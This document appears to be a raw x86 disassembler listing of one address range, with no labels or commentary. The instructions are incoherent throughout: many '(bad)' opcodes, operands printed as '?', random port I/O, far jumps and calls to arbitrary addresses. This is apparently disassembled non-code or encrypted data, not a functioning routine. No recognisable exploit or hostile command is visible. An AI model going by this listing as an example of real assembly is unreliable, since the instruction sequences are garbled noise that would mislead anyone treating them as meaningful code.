  410349:	les    edx,FWORD PTR [edx+eax*1+0x151ce74d]
  410350:	sbb    al,0xf4
  410352:	popa   
  410353:	sbb    ebx,DWORD PTR [edi+0x51]
  410356:	cld    
  410357:	inc    ebx
  410358:	imul   ebp,DWORD PTR [eax],0xffffffc7
  41035b:	xchg   DWORD PTR [ebx+0x65746b],ebx
  410361:	lea    esp,[di+0x45]
  410365:	mov    edx,edx
  410367:	out    0xc0,eax
  410369:	xchg   esp,eax
  41036a:	rcr    DWORD PTR [esi],0x64
  41036d:	fidiv  DWORD PTR [ebx+0x1]
  410370:	daa    
  410371:	out    0xf9,eax
  410373:	clc    
  410374:	jmp    0x410349
  410376:	imul   esi,DWORD PTR [esi],0xdf2a08ed
  41037c:	mov    ds:0x580e1f7,al
  410381:	cld    
  410382:	es inc ebp
  410384:	push   0x35
  410386:	inc    ebp
  410387:	add    eax,0x5ddbf299
  41038c:	sar    DWORD PTR [edx+0x73],1
  41038f:	pop    ds
  410390:	sub    al,0xac
  410392:	enter  0x8c41,0x30
  410396:	fstp   DWORD PTR [ebx+0x60404a4]
  41039c:	arpl   WORD PTR [edx-0x4c0a5dd9],si
  4103a2:	inc    edx
  4103a3:	lds    esp,FWORD PTR [ebp+0x13]
  4103a6:	dec    esi
  4103a7:	sub    BYTE PTR [edi-0x63],dl
  4103aa:	push   ss
  4103ab:	scas   eax,DWORD PTR es:[edi]
  4103ac:	mov    dh,0x4b
  4103ae:	aaa    
  4103af:	dec    edi
  4103b0:	inc    edi
  4103b1:	aaa    
  4103b2:	push   esp
  4103b3:	inc    eax
  4103b4:	outs   dx,BYTE PTR ds:[esi]
  4103b5:	mov    al,ds:0xadb24053
  4103ba:	(bad)  
  4103bc:	pop    ebx
  4103bd:	repnz loopne 0x410426
  4103c0:	mov    ecx,0x3ed29ba
  4103c5:	leave  
  4103c6:	lds    eax,FWORD PTR [edi]
  4103c8:	(bad)  
  4103c9:	and    bl,BYTE PTR [ebx]
  4103cb:	in     eax,dx
  4103cc:	lods   eax,DWORD PTR ds:[esi]
  4103cd:	ret    
  4103ce:	push   0xffffffad
  4103d0:	adc    BYTE PTR [edi],ah
  4103d2:	sub    BYTE PTR [ecx+0x30],0xea
  4103d6:	jbe    0x4103be
  4103d8:	add    BYTE PTR [ebx],dl
  4103da:	adc    dh,al
  4103dc:	fild   QWORD PTR [ecx+0xb8ff3a6]
  4103e2:	add    BYTE PTR [edi+0x8],dl
  4103e5:	and    edx,DWORD PTR [edi]
  4103e7:	pusha  
  4103e8:	jnp    0x41040d
  4103ea:	cwde   
  4103eb:	ja     0x410419
  4103ed:	out    dx,eax
  4103ee:	in     al,dx
  4103ef:	ftst   
  4103f1:	lods   al,BYTE PTR ds:[esi]
  4103f2:	mov    al,ds:0x5882fe0a
  4103f7:	lahf   
  4103f8:	mov    DWORD PTR ds:0x30b85238,ebx
  4103fe:	dec    esp
  4103ff:	(bad)  
  410400:	into   
  410401:	xor    eax,0x70340b86
  410406:	pop    esi
  410407:	leave  
  410408:	je     0x4103b7
  41040a:	out    0x8e,al
  41040c:	sub    al,0x9e
  41040e:	adc    DWORD PTR [esi-0x63022736],edi
  410414:	scas   eax,DWORD PTR es:[edi]
  410415:	aaa    
  410416:	sub    ebp,DWORD PTR [ecx]
  410418:	xchg   BYTE PTR ds:0xe03607c6,bl
  41041e:	add    ch,bh
  410420:	mov    esp,0xd3d82682
  410425:	mov    dh,0x46
  410427:	enter  0xece3,0x3d
  41042b:	adc    bh,BYTE PTR [edx-0x783b0448]
  410431:	mov    DWORD PTR [eax-0xc],esp
  410434:	mov    DWORD PTR [eax+0x6b1a6a2f],0x24f0296e
  41043e:	nop
  41043f:	in     al,0xb0
  410441:	add    al,0x6
  410443:	pop    es
  410444:	xor    DWORD PTR [ebx],edi
  410446:	popa   
  410447:	div    DWORD PTR [ebp-0x717e4840]
  41044d:	jl     0x4103de
  41044f:	xchg   esp,eax
  410450:	fbstp  TBYTE PTR [esi]
  410452:	adc    al,0x31
  410454:	dec    edi
  410455:	imul   ecx,DWORD PTR [eax+0x2f9a60aa],0xffffffcf
  41045c:	hlt    
  41045d:	jg     0x410485
  41045f:	xor    cl,BYTE PTR [edx+0x65]
  410462:	jo     0x4104bf
  410464:	or     eax,0x1334188d
  410469:	jmp    0x202f95b5
  41046e:	adc    al,0xee
  410470:	mov    dl,0x6d
  410472:	imul   BYTE PTR ds:0x70864f7
  410478:	mov    ecx,0x7b0c2172
  41047d:	ret    
  41047e:	das    
  41047f:	clc    
  410480:	push   edi
  410481:	mov    dl,0x63
  410483:	ds sub eax,0x713a81c9
  410489:	mov    eax,ds:0x3c196459
  41048e:	cmp    DWORD PTR ds:0xcd6f4eb9,0x3a39d7a4
  410498:	mov    DWORD PTR [eax+0x3c],ebx
  41049b:	or     dl,BYTE PTR [esi+0x19]
  41049e:	stc    
  41049f:	lock inc ebx
  4104a1:	jecxz  0x41044a
  4104a3:	rol    DWORD PTR [edi*1+0x4ddca78a],cl
  4104aa:	dec    ebp
  4104ab:	addr16 mov edx,0xe516ca19
  4104b1:	push   esp
  4104b2:	dec    ebp
  4104b3:	push   edx
  4104b4:	sbb    al,0xac
  4104b6:	jbe    0x410480
  4104b8:	inc    ebp
  4104b9:	or     eax,0x29a21062
  4104be:	or     BYTE PTR [edi],ch
  4104c0:	pop    ss
  4104c1:	(bad)  
  4104c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104c3:	mov    bl,0x48
  4104c5:	leave  
  4104c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104c7:	loope  0x41049a
  4104c9:	ret    0x828b
  4104cc:	and    eax,0x9a555af6
  4104d1:	fptan  
  4104d3:	adc    al,0xd6
  4104d5:	and    bh,al
  4104d7:	adc    edi,DWORD PTR [edi+0x610c32f8]
  4104dd:	hlt    
  4104de:	or     dl,BYTE PTR [eax-0x62]
  4104e1:	add    DWORD PTR [edx+0x4a],edi
  4104e4:	in     al,dx
  4104e5:	inc    ebx
  4104e6:	pop    ecx
  4104e7:	ins    DWORD PTR es:[edi],dx
  4104e8:	cmc    
  4104e9:	out    0xc5,eax
  4104eb:	aam    0x63
  4104ed:	cmp    BYTE PTR [ebx+0x1],0xf5
  4104f1:	xchg   esp,eax
  4104f2:	mov    eax,0x28ea4641
  4104f7:	call   0x9a11462b
  4104fc:	mov    ecx,0xd04e5ea5
  410501:	inc    edi
  410502:	and    al,0x86
  410504:	push   ebx
  410505:	cmp    eax,0xffffff84
  410508:	add    ebx,eax
  41050a:	loope  0x41052e
  41050c:	js     0x410544
  41050e:	rcr    BYTE PTR [eax-0x3],cl
  410511:	pop    ss
  410512:	add    eax,ebx
  410514:	mov    dh,0xb6
  410516:	adc    cl,BYTE PTR [ecx+0x59]
  410519:	and    al,0x0
  41051b:	pop    esp
  41051c:	jae    0x41051f
  41051e:	mov    ecx,0x842012cf
  410523:	clc    
  410524:	int    0xa7
  410526:	(bad)  
  410527:	in     eax,0xce
  410529:	add    eax,0xf2210c67
  41052e:	shl    DWORD PTR [esi],1
  410530:	pushf  
  410531:	mov    esi,0x2518b5e1
  410536:	cmp    eax,0xcd8150a8
  41053b:	sar    BYTE PTR [esi+0x30],0x3c
  41053f:	xchg   ebp,eax
  410540:	les    ecx,FWORD PTR [ebx]
  410542:	xor    eax,0x8836e83d
  410547:	es (bad) 
  410549:	ins    BYTE PTR es:[edi],dx
  41054a:	fst    QWORD PTR [eax+ecx*1-0x50]
  41054e:	pusha  
  41054f:	dec    ebp
  410550:	lahf   
  410551:	outs   dx,DWORD PTR ds:[esi]
  410552:	enter  0x104f,0x3b
  410556:	sub    cl,BYTE PTR [ecx+eiz*8-0x14f918bc]
  41055d:	add    BYTE PTR [edi+eiz*2+0x56],0x34
  410562:	dec    ecx
  410563:	ss pop esi
  410565:	pop    es
  410566:	and    al,al
  410568:	pop    ds
  410569:	cs je  0x41058f
  41056c:	jge    0x41050d
  41056e:	jns    0x4105eb
  410570:	test   al,0xc5
  410572:	fsub   QWORD PTR [ecx+edx*4+0x63]
  410576:	add    eax,0xe756b2dd
  41057b:	inc    eax
  41057c:	aaa    
  41057d:	jnp    0x4105fe
  41057f:	(bad)  
  410580:	pop    ebx
  410581:	and    al,0xd5
  410583:	lock adc esp,esi
  410586:	(bad)
  41058b:	ror    DWORD PTR [eax-0x78],1
  41058e:	sbb    BYTE PTR [edi+0x37],ch
  410591:	cmc    
  410592:	dec    edi
  410593:	pop    ebx
  410594:	(bad)  
  410595:	stos   DWORD PTR es:[edi],eax
  410596:	mov    esp,0xa91cbb0a
  41059b:	call   0x7901:0xeb0c91e5
  4105a2:	pop    edi
  4105a3:	jp     0x4105c3
  4105a5:	pop    ecx
  4105a6:	mov    ch,0x3f
  4105a8:	jae    0x410549
  4105aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105ab:	in     eax,dx
  4105ac:	xor    eax,0x93102f2a
  4105b1:	mov    ds:0xa142e579,al
  4105b6:	and    eax,0xf085e1e
  4105bb:	and    eax,0xd0a1dc30
  4105c0:	sub    DWORD PTR [ebx+0x1e],ecx
  4105c3:	cmc    
  4105c4:	pop    ss
  4105c5:	mov    ah,0x13
  4105c7:	mov    bl,0xf4
  4105c9:	std    
  4105ca:	dec    ebx
  4105cb:	fld    QWORD PTR [ecx+0x6b]
  4105ce:	mov    edi,0xf4efc0ba
  4105d3:	jnp    0x4105c2
  4105d5:	aad    0xef
  4105d7:	ins    BYTE PTR es:[edi],dx
  4105d8:	inc    esi
  4105d9:	jl     0x410627
  4105db:	add    ch,BYTE PTR [edi]
  4105dd:	sbb    ebp,eax
  4105df:	call   0xc97d6144
  4105e4:	jp     0x41064b
  4105e6:	inc    esp
  4105e7:	jb     0x4105a8
  4105e9:	sbb    BYTE PTR [ecx-0x56],0x3e
  4105ed:	imul   ebx,DWORD PTR [eax],0xb9dc31e3
  4105f3:	jmp    0x41057c
  4105f5:	push   0xfa3cd097
  4105fa:	pop    eax
  4105fb:	adc    al,0xa8
  4105fd:	mov    ecx,0x8eeb76ea
  410602:	icebp  
  410603:	idiv   edx
  410605:	add    ecx,ebp
  410607:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410609:	pusha  
  41060a:	xchg   DWORD PTR [ecx-0x7c],edx
  41060d:	test   BYTE PTR [edi-0x43a5ee63],al
  410613:	call   0x16382966
  410618:	cmp    esi,ebp
  41061a:	mov    dl,0x54
  41061c:	jo     0x410675
  41061e:	xchg   ebp,eax
  41061f:	xchg   ax,ax
  410621:	pop    ecx
  410622:	fisttp QWORD PTR [ebx-0x716317b3]
  410628:	sti    
  410629:	out    0x3b,eax
  41062b:	mov    ds:0x1f383bb3,al
  410630:	les    ebx,FWORD PTR [eax-0x4c]
  410633:	sub    eax,0xc365bc4b
  410638:	nop
  410639:	mov    bl,0x6
  41063b:	jge    0x410655
  41063d:	ins    DWORD PTR es:[edi],dx
  41063e:	ror    bh,1
  410640:	sbb    ebx,DWORD PTR [ebp-0x163a2d43]
  410646:	xor    al,0xa3
  410648:	mov    ds:0xdb2618a9,eax
  41064d:	push   cs
  41064e:	out    0xdf,eax
  410650:	and    BYTE PTR [ebp+0x7c],dl
  410653:	mov    edx,0xf81b98f8
  410658:	neg    bh
  41065a:	adc    cl,bh
  41065c:	or     ebp,ebx
  41065e:	adc    ch,BYTE PTR [esi+0x61]
  410661:	jmp    0x945e:0x19fb2907
  410668:	addr16 ret 
  41066a:	xchg   ebp,eax
  41066b:	in     eax,0xbe
  41066d:	jno    0x41061f
  41066f:	mov    DWORD PTR [eax+esi*2],esi
  410672:	xchg   esi,eax
  410673:	fld    QWORD PTR ds:0x17dde53a
  410679:	sbb    eax,DWORD PTR [ecx+0x66]
  41067c:	pop    ecx
  41067d:	mov    dl,0xb6
  41067f:	clc    
  410680:	cmp    ebp,ebx
  410682:	fs das 
  410684:	pop    esp
  410685:	dec    ecx
  410686:	enter  0x6841,0xd2
  41068a:	cli    
  41068b:	sbb    esi,0xffffffa8
  41068e:	xchg   ecx,eax
  41068f:	paddsw mm3,QWORD PTR [edx]
  410692:	inc    edx
  410693:	jns    0x4106c8
  410695:	cmp    eax,0xeaf759a3
  41069a:	push   eax
  41069b:	ja     0x410686
  41069d:	mov    eax,0xea1e3120
  4106a2:	add    dl,BYTE PTR [ebx]
  4106a4:	cmp    eax,0x5f2d3c6
  4106a9:	add    eax,0x491da91f
  4106af:	(bad)  
  4106b0:	sbb    ah,ah
  4106b2:	jno    0x410674
  4106b4:	adc    al,0x91
  4106b6:	cld    
  4106b7:	inc    esi
  4106b8:	test   al,0xea
  4106ba:	mov    dl,0x1
  4106bc:	pop    es
  4106bd:	hlt    
  4106be:	jmp    0x7adb:0xd4efd3e5
  4106c5:	inc    edx
  4106c6:	icebp  
  4106c7:	stc    
  4106c8:	push   0x9350d80b
  4106cd:	(bad)  
  4106ce:	or     ebp,DWORD PTR [edi+esi*1]
  4106d1:	ret    0x530d
  4106d4:	sub    al,0x47
  4106d6:	loope  0x4106a8
  4106d8:	ins    DWORD PTR es:[edi],dx
  4106d9:	ds dec ebx
  4106db:	jecxz  0x4106d4
  4106dd:	retf   0xb4c9
  4106e0:	push   ecx
  4106e1:	xor    al,0xa1
  4106e3:	mov    ?,eax
  4106e5:	inc    esp
  4106e6:	hlt    
  4106e7:	call   0xb677:0x16a8867a
  4106ee:	mov    DWORD PTR [ebx-0x7f],edi
  4106f1:	pop    eax
  4106f2:	cmp    BYTE PTR [eax-0x7a564d52],bh
  4106f8:	cmp    edi,esi
  4106fa:	mov    eax,0x92d589bf
  4106ff:	mov    cs,WORD PTR [ebx]
  410701:	and    al,0x96
  410703:	and    edx,DWORD PTR [edx-0x508ba39d]
  410709:	cs inc ebp
  41070b:	ret    
  41070c:	(bad)  
  41070d:	js     0x41074a
  41070f:	adc    DWORD PTR [ebx-0xc],eax
  410712:	sub    esp,DWORD PTR [esi]
  410714:	dec    edi
  410715:	arpl   cx,sp
  410717:	sbb    ecx,DWORD PTR [edi]
  410719:	pop    esp
  41071a:	xor    ch,BYTE PTR [ebx]
  41071c:	push   ecx
  41071d:	int3   
  41071e:	sub    eax,0x599df2c5
  410723:	pusha  
  410724:	clc    
  410725:	pop    ds
  410726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410727:	adc    esi,DWORD PTR [ecx+ebp*8-0x276cb1f9]
  41072e:	repnz sbb ebx,esp
  410731:	mov    al,0xb
  410733:	pushf  
  410734:	repnz pop ebx
  410736:	loope  0x4106c8
  410738:	(bad)  
  41073a:	fwait
  41073b:	push   edx
  41073c:	lahf   
  41073d:	xchg   BYTE PTR [ecx],ch
  41073f:	sahf   
  410740:	jecxz  0x410765
  410742:	imul   BYTE PTR [eax+0x3]
  410745:	dec    ebp
  410746:	fisttp DWORD PTR [ecx+0x44355def]
  41074c:	fsubr  QWORD PTR [ebp-0x66e71150]
  410752:	fnop   
  410754:	(bad)  
  410755:	fsubr  DWORD PTR [ebp+0x4b]
  410758:	sahf   
  410759:	popf   
  41075a:	(bad)
  41075e:	push   esi
  41075f:	(bad)  
  410761:	rol    DWORD PTR [edi-0x4c9f3817],cl
  410767:	jge    0x4106ee
  410769:	xor    al,0x3b
  41076b:	js     0x4107be
  41076d:	fisttp QWORD PTR fs:[eax+ebx*1]
  410771:	dec    eax
  410772:	in     al,dx
  410773:	into   
  410774:	jmp    0x4107c0
  410776:	xor    BYTE PTR ds:0x607c7250,bh
  41077c:	inc    esp
  41077d:	icebp  
  41077e:	das    
  41077f:	cmp    eax,0x1c01e3ab
  410784:	test   al,0x6e
  410786:	mov    dl,0x75
  410788:	pop    edx
  410789:	mov    ds:0x2961437d,eax
  41078e:	out    0x9a,eax
  410790:	mov    bl,0x8e
  410792:	call   0x276158dc
  410797:	mov    eax,ds:0xa3c8ac08
  41079c:	fild   WORD PTR [edx]
  41079e:	xchg   esi,eax
  41079f:	ss push ebp
  4107a2:	das    
  4107a3:	js     0x4107e0
  4107a5:	xchg   eax,edi
  4107a7:	dec    DWORD PTR ds:0xf92b292d
  4107ad:	jmp    0x41079a
  4107af:	sbb    ebp,0x43402d79
  4107b5:	inc    ebx
  4107b6:	or     eax,0x10baae50
  4107bb:	cwde   
  4107bc:	xchg   ebp,eax
  4107bd:	cmp    ch,BYTE PTR [esi+0x60]
  4107c0:	sub    eax,0xf4fae082
  4107c5:	test   bh,0xce
  4107c8:	or     BYTE PTR [ecx],0x7
  4107cb:	inc    esi
  4107cc:	out    0x80,eax
  4107ce:	fs aam 0x9c
  4107d1:	mov    ah,0x4a
  4107d3:	jl     0x410803
  4107d5:	inc    ebx
  4107d6:	xor    BYTE PTR [ebp+0x5a01f964],al
  4107dc:	or     al,0x83
  4107de:	jl     0x41077d
  4107e0:	ret    0x210b
  4107e3:	in     al,0xf7
  4107e5:	stos   BYTE PTR es:[edi],al
  4107e6:	lahf   
  4107e7:	mov    al,0x7e
  4107e9:	add    eax,0x22d96abc
  4107ee:	ins    DWORD PTR es:[edi],dx
  4107ef:	fsubr  DWORD PTR [ebp+0x73]
  4107f2:	sbb    BYTE PTR [ebp-0x61],bh
  4107f5:	xlat   BYTE PTR ds:[ebx]
  4107f6:	jg     0x410797
  4107f8:	bound  ebp,QWORD PTR [eax-0x68]
  4107fb:	ret    
  4107fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107fd:	hlt    
  4107fe:	in     al,dx
  4107ff:	cli    
  410800:	lods   eax,DWORD PTR ds:[esi]
  410801:	sbb    al,0xd7
  410803:	cmp    BYTE PTR [ebp+edx*1+0x59],dl
  410807:	cld    
  410808:	fdivr  QWORD PTR [ebx]
  41080a:	xchg   esi,eax
  41080b:	mov    bh,0x2a
  41080d:	test   eax,0x493678ec
  410812:	je     0x4107f0
  410814:	fild   QWORD PTR ss:[edx+0x20]
  410818:	jns    0x410880
  41081a:	ins    DWORD PTR es:[edi],dx
  41081b:	rcr    BYTE PTR [edi-0x6e],1
  41081e:	scas   al,BYTE PTR es:[edi]
  41081f:	rol    DWORD PTR [esi+edi*4-0x4],0x88
  410824:	sbb    BYTE PTR [edx+0x7],0x5
  410828:	pop    ss
  410829:	jmp    0x1fea:0x1518546b
  410830:	btr    DWORD PTR [ebp+0x55],esp
  410834:	or     esi,DWORD PTR [edx-0x76966ea]
  41083a:	cdq    
  41083b:	sbb    BYTE PTR [ecx+0x33dc8590],ah
  410841:	bound  ebx,QWORD PTR [edx-0x4a23869f]
  410847:	jno    0x4107ee
  410849:	stos   BYTE PTR es:[edi],al
  41084a:	xchg   ecx,eax
  41084b:	pop    ecx
  41084c:	push   0x53ba09e6
  410851:	jo     0x4108b6
  410853:	shr    DWORD PTR [edi],1
  410855:	xchg   edi,eax
  410856:	jne    0x4107e7
  410858:	lock les esi,FWORD PTR [ecx*2+0x5e4b9955]
  410860:	in     al,dx
  410861:	and    ecx,DWORD PTR [edx+0x32e10772]
  410867:	and    ebx,DWORD PTR [eax-0x3ac9cdf9]
  41086d:	mov    ss:0xf9e0ba52,eax
  410873:	shr    DWORD PTR ds:0x86fcd7a0,1
  410879:	inc    ebx
  41087a:	pop    ebx
  41087b:	adc    al,BYTE PTR [ebp-0x16]
  41087e:	sbb    DWORD PTR [ebp-0x48e116d3],edx
  410884:	xor    dh,BYTE PTR [edx-0x70812e61]
  41088a:	ret    
  41088b:	xor    ah,BYTE PTR [ecx+0x68]
  41088e:	mov    ah,0x55
  410890:	xor    ebx,DWORD PTR [eax-0x4]
  410893:	dec    ebp
  410894:	das    
  410895:	out    dx,al
  410896:	cli    
  410897:	mov    bh,0x9b
  410899:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41089a:	jle    0x410859
  41089c:	scas   al,BYTE PTR es:[edi]
  41089d:	(bad)  
  41089e:	xchg   ebp,eax
  41089f:	add    cl,BYTE PTR [eax-0x58cadfa]
  4108a5:	jne    0x41088e
  4108a7:	mov    edi,0x2c37118
  4108ac:	mov    al,0x39
  4108ae:	frstor [ebp+0x7a]
  4108b1:	mov    dl,0xec
  4108b3:	push   esp
  4108b4:	mov    ebx,0x2f3de432
  4108b9:	push   ss
  4108ba:	push   esi
  4108bb:	mov    DWORD PTR [edi+ebp*4-0x11c89144],ebp
  4108c2:	jle    0x410934
  4108c4:	inc    ebp
  4108c5:	test   BYTE PTR [ebx-0x3f9315de],bh
  4108cb:	mov    al,0xd7
  4108cd:	mov    dh,0xa1
  4108cf:	imul   ebp,DWORD PTR [ebx],0xffffffaa
  4108d2:	pop    esp
  4108d3:	shl    DWORD PTR [ebx+0x2d6f8d72],0xb9
  4108da:	mov    esi,0x7b9c6173
  4108df:	pusha  
  4108e0:	mov    ah,0x9e
  4108e2:	je     0x4108c3
  4108e4:	loopne 0x410867
  4108e6:	int    0x82
  4108e8:	xor    ebp,0xc2cc75f8
  4108ee:	jmp    0x92e4:0x15f4c441
  4108f5:	push   edi
  4108f6:	pusha  
  4108f7:	add    al,0xd1
  4108f9:	dec    ebp
  4108fa:	addr16 inc eax
  4108fc:	push   esp
  4108fd:	rcr    BYTE PTR [edi+0x5b13bc3c],1
  410903:	dec    esi
  410904:	ret    
  410905:	sar    BYTE PTR [edx],0x10
  410908:	xchg   BYTE PTR [edx],bl
  41090a:	mov    al,ds:0x52edde74
  41090f:	faddp  st(6),st
  410911:	pop    edi
  410912:	xchg   esp,eax
  410913:	sbb    eax,0x9446b5ea
  410918:	pushf  
  410919:	dec    ecx
  41091a:	xor    edi,DWORD PTR [esi+0x4139254c]
  410920:	mov    ah,0xa8
  410922:	rol    BYTE PTR [eax-0x1e6a7a0d],cl
  410928:	mov    bl,0x60
  41092a:	pusha  
  41092b:	xchg   ebp,eax
  41092c:	gs mov esp,0x73882826
  410932:	xor    ecx,DWORD PTR [eax+0x1bb3b9fb]
  410938:	mov    cl,0x83
  41093a:	sbb    DWORD PTR [ebx-0x5d],ebp
  41093d:	jmp    0xdf9aef94
  410942:	retf   0xf15c
  410945:	test   DWORD PTR [eax-0x65ec7fdc],esi
  41094b:	psllq  mm4,QWORD PTR [eax-0x14e8ba66]
  410952:	cmp    eax,0x19981c7
  410957:	imul   eax,DWORD PTR [ebx+ebx*8+0x78caa1dd],0x5e90ab24
  410962:	stos   DWORD PTR es:[edi],eax
  410963:	xor    edx,eax
  410965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410966:	mov    ch,0x89
  410968:	sbb    ah,dl
  41096a:	or     DWORD PTR [edx-0x48],esi
  41096d:	in     eax,0x39
  41096f:	add    al,0x56
  410971:	out    0x1,eax
  410973:	adc    esi,ecx
  410975:	push   es
  410976:	jne    0x410999
  410978:	adc    dh,BYTE PTR [edi]
  41097a:	mov    WORD PTR [ebx],?
  41097c:	mov    cl,0x50
  41097e:	xor    dh,BYTE PTR [ebp+0x5935c4df]
  410984:	mov    cl,0x36
  410986:	outs   dx,DWORD PTR ds:[esi]
  410987:	push   edi
  410988:	add    al,0x3
  41098a:	lds    esi,FWORD PTR [edx+0x6cee4b44]
  410990:	and    al,0xd5
  410992:	imul   ebp,DWORD PTR [esp+eax*2+0x4d255e67],0xffffff84
  41099a:	inc    edi
  41099b:	push   cs
  41099c:	in     eax,0x7e
  41099e:	imul   ecx,ebp,0xffffff9b
  4109a1:	outs   dx,DWORD PTR ds:[esi]
  4109a2:	cli    
  4109a3:	and    dh,BYTE PTR [ebp+0x3eafc92a]
  4109a9:	sahf   
  4109aa:	mov    ds,WORD PTR [eax+eiz*4-0x16126ebe]
  4109b1:	or     al,BYTE PTR [ecx+0x4f718fba]
  4109b7:	retf   0x419
  4109ba:	dec    edi
  4109bb:	lods   eax,DWORD PTR ds:[esi]
  4109bc:	pop    ecx
  4109bd:	pushf  
  4109be:	or     edx,DWORD PTR [ebp-0x5]
  4109c1:	mov    edx,0x4bca6de2
  4109c6:	ret    
  4109c7:	dec    edx
  4109c8:	jb     0x410a45
  4109ca:	and    al,0xcf
  4109cc:	pop    ebp
  4109cd:	add    al,0xc2
  4109cf:	xchg   esi,eax
  4109d0:	add    dh,BYTE PTR [esi+0x69d40fd1]
  4109d6:	push   es
  4109d7:	inc    esi
  4109d8:	mov    dh,0x18
  4109da:	xor    edi,ebp
  4109dc:	mov    ds:0x467940ee,eax
  4109e1:	cdq    
  4109e2:	lock lds edi,FWORD PTR [ebx]
  4109e5:	mov    al,0x36
  4109e7:	pop    ebp
  4109e8:	or     BYTE PTR [eax-0x68],bl
  4109eb:	and    BYTE PTR [edx+0x1f],bl
  4109ee:	mov    esp,0xb37e355e
  4109f3:	inc    ebx
  4109f4:	les    esp,FWORD PTR [eax-0x23]
  4109f7:	sti    
  4109f8:	cli    
  4109f9:	arpl   dx,di
  4109fb:	jae    0x410a30
  4109fd:	js     0x410a23
  4109ff:	push   esp
  410a00:	xor    cl,BYTE PTR [edx-0x4c]
  410a03:	mov    ebx,0x6bec3a6a
  410a08:	in     al,0x23
  410a0a:	sub    BYTE PTR [edi+ecx*8+0x638cf60a],0x82
  410a12:	sub    eax,0xac46c3ec
  410a17:	mov    eax,0xc2a9f6a
  410a1c:	cmp    cl,BYTE PTR [ebx+0x528dd89e]
  410a22:	mov    ch,0x4e
  410a24:	xchg   esp,eax
  410a25:	mov    ch,0x6e
  410a27:	sub    al,0x13
  410a29:	jg     0x410a38
  410a2b:	scas   eax,DWORD PTR es:[edi]
  410a2c:	cmp    ah,bh
  410a2e:	or     DWORD PTR [edx],ebx
  410a30:	and    bh,BYTE PTR [esi+0x17]
  410a33:	push   edi
  410a34:	xor    eax,0xb841df8b
  410a39:	mov    WORD PTR [eax+ebp*1+0x28],?
  410a3d:	pop    ss
  410a3e:	call   0x126a58c1
  410a43:	push   ds
  410a44:	push   ds
  410a45:	mov    ch,0xd5
  410a47:	aaa    
  410a48:	push   eax
  410a49:	jp     0x4109d0
  410a4b:	fdecstp 
  410a4d:	dec    ecx
  410a4e:	loopne 0x410aad
  410a50:	cmp    eax,0x635e4197
  410a55:	shr    dl,1
  410a57:	push   edx
  410a58:	lods   eax,DWORD PTR ds:[esi]
  410a59:	(bad)  
  410a5a:	sahf   
  410a5b:	push   esp
  410a5c:	add    esp,ebx
  410a5e:	ret    0xcd75
  410a61:	in     eax,dx
  410a62:	call   0x78c63a95
  410a67:	pushf  
  410a68:	push   0x1d73985d
  410a6d:	mov    ebp,0xbdea593a
  410a72:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a74:	mov    eax,0x774e3066
  410a79:	jg     0x410a18
  410a7b:	adc    dl,BYTE PTR [edi-0x26]
  410a7e:	mov    dh,BYTE PTR [edx-0x315eae46]
  410a84:	lock popf 
  410a86:	pop    edx
  410a87:	enter  0xed73,0x90
  410a8b:	ins    BYTE PTR es:[edi],dx
  410a8c:	or     al,0x8
  410a8e:	mov    ?,WORD PTR [edx]
  410a90:	sbb    BYTE PTR [edi],dh
  410a92:	inc    edi
  410a93:	pop    ecx
  410a94:	icebp  
  410a95:	add    BYTE PTR [ebx+edx*4+0x64],dl
  410a99:	inc    edx
  410a9a:	shl    bh,0xad
  410a9d:	push   cs
  410a9e:	and    ecx,DWORD PTR [ebp+0x1535c139]
  410aa4:	jno    0x410ad4
  410aa6:	test   BYTE PTR [edi-0x191bc96f],bl
  410aac:	out    dx,eax
  410aad:	adc    ebx,edx
  410aaf:	or     eax,DWORD PTR [ecx]
  410ab1:	or     edx,DWORD PTR [edx+eax*2+0x26771a15]
  410ab8:	xchg   BYTE PTR [edx-0x2b264f41],cl
  410abe:	out    0x8d,al
  410ac0:	push   ebx
  410ac1:	mov    ebp,DWORD PTR [ebx]
  410ac3:	(bad)  [eax-0x10]
  410ac6:	sar    esp,1
  410ac8:	and    al,0xfc
  410aca:	xchg   BYTE PTR [edi-0x1b],bl
  410acd:	xor    bl,dl
  410acf:	inc    esi
  410ad0:	lahf   
  410ad1:	in     al,0x41
  410ad3:	sbb    al,0x69
  410ad5:	rcl    BYTE PTR [edi+0x484e96d8],0x63
  410adc:	push   edi
  410add:	pop    edx
  410ade:	add    BYTE PTR [edi-0x32],cl
  410ae1:	fstp   QWORD PTR [eax+0x6382a7a0]
  410ae7:	rol    DWORD PTR [ecx-0x19],1
  410aea:	popf   
  410aeb:	adc    dh,dh
  410aed:	(bad)  
  410aee:	or     al,0xf
  410af0:	xchg   esp,eax
  410af1:	xchg   esi,eax
  410af2:	gs call 0x4ea6d00e
  410af8:	popa   
  410af9:	(bad)  
  410afa:	ret    
  410afb:	mov    esi,0xe9903ee8
  410b00:	push   esp
  410b01:	or     esp,0xc340772a
  410b07:	jge    0x410b2a
  410b09:	mov    ch,0x4c
  410b0b:	adc    cl,BYTE PTR [ecx+0x5a1207d6]
  410b11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b12:	add    DWORD PTR [esi],esp
  410b14:	test   DWORD PTR [edi],0xecd68b21
  410b1a:	clc    
  410b1b:	and    bl,dl
  410b1d:	mov    ah,0x96
  410b1f:	pop    es
  410b20:	sbb    al,0xb8
  410b22:	(bad)  
  410b23:	pop    ss
  410b24:	jns    0x410b0c
  410b26:	pop    eax
  410b27:	mov    ds:0x8af3fa3b,eax
  410b2c:	lods   eax,DWORD PTR ds:[esi]
  410b2d:	mov    ss,edx
  410b2f:	mov    BYTE PTR [edx-0x73e04d2e],cl
  410b35:	dec    ebx
  410b36:	loopne 0x410b9b
  410b38:	adc    DWORD PTR [eax],eax
  410b3a:	xor    cl,BYTE PTR [edx]
  410b3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b3d:	(bad)  [eax]
  410b3f:	loop   0x410ac1
  410b41:	pop    edx
  410b42:	pop    esp
  410b43:	out    0x56,al
